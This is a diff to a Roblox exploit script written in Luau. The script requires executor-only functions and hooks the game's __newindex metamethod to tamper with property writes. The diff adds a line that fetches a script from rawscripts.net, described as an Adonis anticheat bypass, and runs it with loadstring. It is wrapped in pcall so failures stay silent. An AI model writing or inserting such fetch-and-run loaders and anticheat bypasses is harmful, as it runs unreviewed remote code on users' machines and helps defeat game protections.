@@ -3,6 +3,10 @@
 if not hookmetamethod or not newcclosure or not checkcaller then
 	return error("unsupported executor", 2);
 end;
+pcall(newcclosure(@native function(...)
+	return loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Adonis-actul-bypass-20697"))();
+end));
+task.wait(1);
 local enabled; enabled = false;
 local hook; hook = hookmetamethod(game, "__newindex", newcclosure(@native function(table, index, value)
 	if not checkcaller() and enabled then
